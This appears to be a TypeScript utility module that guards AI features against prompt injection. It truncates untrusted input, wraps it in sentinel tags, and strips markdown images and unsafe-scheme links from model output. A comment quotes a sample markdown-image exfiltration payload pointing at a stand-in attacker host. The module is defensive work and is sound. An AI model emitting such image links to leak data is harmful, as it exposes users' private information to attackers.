/**
 * Prompt-injection and cost guards for AI features.
 * Ship order per research brief: spotlighting, truncation, markdown-image strip.
 */

export const MAX_INPUT_CHARS = 32_000; // ~8k tokens at ~4 chars/token
export const MAX_REWRITE_INPUT_CHARS = 16_000;

/** Approximate token count from character count. Anthropic averages ~4 chars/token. */
export function approxTokens(text: string): number {
  return Math.ceil(text.length / 4);
}

/** Truncate untrusted content to a safe character ceiling with explicit marker. */
export function truncate(text: string, maxChars = MAX_INPUT_CHARS): string {
  if (text.length <= maxChars) return text;
  return text.slice(0, maxChars) + '\n\n[... content truncated to protect against token-bloat ...]';
}

/**
 * Spotlight untrusted content so the model treats it as data, not instructions.
 * Wraps input in tagged delimiters that the system prompt references.
 */
export function spotlight(untrusted: string, tag = 'untrusted_content'): string {
  // Strip any existing occurrence of the sentinel tags to prevent cheap injection.
  const cleaned = untrusted.replace(/<\/?untrusted_content[^>]*>/gi, '');
  return `<${tag}>\n${cleaned}\n</${tag}>`;
}

/**
 * Strip markdown image syntax from generated drafts. Images are a known
 * exfiltration vector ("![](attacker.com/?data=...)") and drafts never need
 * to include them.
 */
export function stripMarkdownImages(text: string): string {
  return text.replace(/!\[[^\]]*\]\([^)]+\)/g, '');
}

/**
 * Strip raw URLs pointing to nonstandard schemes (javascript:, data:, file:).
 * Keep http/https/mailto/tel.
 */
export function stripUnsafeLinks(text: string): string {
  return text.replace(
    /\[([^\]]*)\]\(\s*(?!https?:|mailto:|tel:|\/)[^)]+\)/gi,
    '$1'
  );
}

/** One-shot output filter applied to every generated draft. */
export function sanitizeOutput(text: string): string {
  return stripUnsafeLinks(stripMarkdownImages(text)).trim();
}
